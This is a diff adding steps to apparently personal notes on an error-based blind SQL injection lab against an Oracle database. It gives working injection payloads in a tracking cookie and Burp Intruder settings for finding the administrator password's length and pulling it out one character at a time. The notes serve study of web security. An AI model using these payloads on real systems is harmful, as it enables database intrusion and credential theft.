@@ -56,3 +56,37 @@ typically in the context of security testing with permission.
 
 ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='nonexistentuser') || '
 -> No Error -> FROM users where username ='nonexistentuser' evaluted to false which means the select case didn't run
+
+4) Determine length of password
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '
+-> Error, must be greater than 1 -> You have to make sure your syntax is correct, because you could get an error for that.
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>50) || '
+-> No Error -> Must not be greater than 50
+
+5)
+-Send to Intruder
+-Cookie: TrackingId=6Ye5qjNoM4735Q6w'+||+(select+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username%3d'administrator'+and+LENGTH(password)>§1§)+||+';
+-Payload -> Numbers -> 1 to 50
+-Start Attack
+->20
+
+5)
+first letter = a? Output Error else 200 Response
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || '
+-Send to Intruder
+-Mark 'a'
+-Brute forcer
+-alpha numeric characters
+-Min 1, Max 1
+-> Response w
+
+-Clear
+-Mark '1' and 'a'
+-TrackingId=2fRw7i667AduSr3v'+||+(select+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username%3d'administrator'+and+substr(password,§1§,1)%3d'§a§')+||+'
+-Payload 1, Numbers, 1 to 20, step 1
+-Cluster bomb
+-Payload 2
+-Brute forcer
+-alpha numeric characters
+-Min 1, Max 1
+-Filter by Server error
